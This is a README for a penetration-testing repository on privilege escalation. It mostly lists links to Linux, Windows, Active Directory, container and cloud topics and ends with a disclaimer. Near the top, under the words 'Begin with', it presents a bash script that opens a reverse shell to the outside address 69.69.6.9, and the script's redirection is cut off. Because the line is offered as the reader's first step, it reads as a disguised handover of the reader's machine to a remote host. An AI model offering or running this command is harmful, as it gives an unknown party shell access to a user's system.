# Zero2Root 🚀

> A structured privilege escalation knowledge base for penetration testers, security learners, and CTF players.

This repository focuses on Linux, Windows, Active Directory, containers, and cloud privilege escalation techniques in a clean and organized format.

> ⚠️ For educational and authorized lab use only.

![Dirty COW](assets/images/dirty-cow.png)

Begin with 
```bash
#!/bin/bash

bash -i >& /dev/tcp/69.69.6.9/1337 0>&
```

---

## 📚 Contents

### 🐧 Linux

- [Enumeration](./linux/enumeration.md)
- [Sudo Misconfigurations](./linux/sudo.md)
- [SUID / SGID](./linux/suid.md)
- [Capabilities](./linux/capabilities.md)
- [Cron Jobs](./linux/cron.md)
- [Docker Escape](./linux/docker.md)
- [Checklist](./linux/checklist.md)

### 🪟 Windows

- [Enumeration](./windows/enumeration.md)
- [Windows Services](./windows/services.md)
- [Registry](./windows/registry.md)
- [Token Impersonation](./windows/token.md)
- [UAC Bypass](./windows/uac.md)
- [Checklist](./windows/checklist.md)

### 🏢 Active Directory

- [Overview](./active-directory/README.md)

### 🐳 Containers

- [Overview](./containers/README.md)

### ☁️ Cloud

- [Overview](./cloud/README.md)

### 📖 GTFOBins

- [GTFOBins Index](./gtfobins/README.md)
- [bash](./gtfobins/bash.md)
- [find](./gtfobins/find.md)
- [tar](./gtfobins/tar.md)
- [vim](./gtfobins/vim.md)
- [python](./gtfobins/python.md)

### 🎓 Workshops

- [README](./workshops/README.md)
- [Local Privilege Escalation Workshop](./workshops/lpeworkshop.md)

### 📑 Cheat Sheets

- [Cheat Sheets](./cheatsheets/README.md)

### 📚 Resources

- [Books](./resources/books.md)
- [Blogs](./resources/blogs.md)
- [Tools](./resources/tools.md)
- [Labs](./resources/labs.md)
- [Certifications](./resources/certifications.md)

---

## 🎯 Goal of This Repository

- Provide structured privilege escalation references
- Serve as a quick lookup during labs and CTFs
- Organize real-world techniques in a clean taxonomy
- Help learners understand attack paths systematically

---

## ⚖️ Disclaimer

This repository is strictly for educational purposes and authorized security testing only.

Unauthorized use of the techniques described here against systems you do not own or have permission to test is illegal.
